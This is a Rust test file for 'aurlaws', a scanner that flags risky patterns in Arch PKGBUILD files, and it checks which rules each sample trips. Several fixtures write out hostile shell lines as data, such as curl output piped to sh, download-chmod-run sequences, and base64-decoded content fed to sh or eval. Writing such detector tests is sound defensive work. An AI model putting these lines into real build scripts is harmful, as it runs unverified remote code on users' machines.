// SPDX-License-Identifier: GPL-2.0-or-later
//! Red first: each row is a PKGBUILD (and optional .install) with the laws it must break.
use aurlaws::{LawId, Verdict, audit_text};

const HEAD: &str = "pkgname=demo\npkgver=1.0\npkgrel=1\narch=(any)\nurl=https://example.org/demo\n";

fn pkg(body: &str) -> String {
    format!("{HEAD}{body}\n")
}

#[test]
fn laws_table() {
    let rows: &[(&str, String, Option<&str>, &[LawId])] = &[
        (
            "curl piped to shell",
            pkg("build() { curl -s http://203.0.113.9/x | sh; }"),
            None,
            &[LawId::FetchExecuteUnverified],
        ),
        (
            "download then run through a variable",
            pkg("build() { u=http://203.0.113.9/x; curl -o /tmp/a \"$u\"; chmod +x /tmp/a; /tmp/a; }"),
            None,
            &[LawId::FetchExecuteUnverified],
        ),
        (
            "checksum before running clears the law",
            pkg("build() { curl -o a.sh http://example.org/a.sh; echo \"abc  a.sh\" | sha256sum -c; sh a.sh; }"),
            None,
            &[],
        ),
        (
            "checksum after running does not",
            pkg("build() { curl -o a.sh http://example.org/a.sh; sh a.sh; echo \"abc  a.sh\" | sha256sum -c; }"),
            None,
            &[LawId::FetchExecuteUnverified],
        ),
        (
            "decode into a shell",
            pkg("build() { echo aGVsbG8K | base64 -d | sh; }"),
            None,
            &[LawId::DecodeExecute],
        ),
        (
            "decode through a variable into eval",
            pkg("build() { x=$(base64 -d blob); eval \"$x\"; }"),
            None,
            &[LawId::DecodeExecute],
        ),
        (
            "a decoded icon is not executed",
            pkg("package() { base64 -d icon.b64 > \"$pkgdir/icon.png\"; }"),
            None,
            &[],
        ),
        (
            "eval of what cannot be known",
            pkg("build() { eval \"$(some_tool --print)\"; }"),
            None,
            &[LawId::UnresolvedDynamic],
        ),
        (
            "literal eval is resolved, and its content judged",
            pkg("build() { c='curl -s http://203.0.113.9/x | sh'; eval \"$c\"; }"),
            None,
            &[LawId::FetchExecuteUnverified],
        ),
        (
            "a plain build is quiet",
            pkg("source=(https://example.org/demo-1.0.tar.gz)\nsha256sums=(0000000000000000000000000000000000000000000000000000000000000000)\nbuild() { cd demo-$pkgver; ./configure --prefix=/usr; make; }\npackage() { cd demo-$pkgver; make DESTDIR=\"$pkgdir\" install; }"),
            None,
            &[],
        ),
    ];
    for (name, pkgbuild, install, want) in rows {
        let r = audit_text(pkgbuild, *install);
        let mut got: Vec<LawId> = r.findings.iter().map(|f| f.law).collect();
        got.sort();
        got.dedup();
        assert_eq!(&got, want, "{name}: {:#?}", r.findings);
        let expect = if want.is_empty() {
            Verdict::NoLawBroken
        } else {
            Verdict::NeedsReview
        };
        assert_eq!(r.verdict, expect, "{name}");
    }
}

#[test]
fn a_finding_is_one_sentence_with_file_and_line() {
    let r = audit_text(&pkg("build() {\n  curl -s http://203.0.113.9/x | sh\n}"), None);
    let f = &r.findings[0];
    assert!(f.sentence.contains("PKGBUILD:7"), "{}", f.sentence);
    assert!(f.sentence.contains("http://203.0.113.9/x"), "{}", f.sentence);
    assert!(!f.sentence.contains('\n'), "{}", f.sentence);
}

#[test]
fn nothing_ever_says_safe() {
    let r = audit_text(&pkg(""), None);
    assert_eq!(r.verdict, Verdict::NoLawBroken);
    let text = serde_json::to_string(&r).unwrap().to_lowercase();
    assert!(!text.contains("\"safe\""), "{text}");
    assert!(r.disclaimer.contains("does not mean"), "{}", r.disclaimer);
}
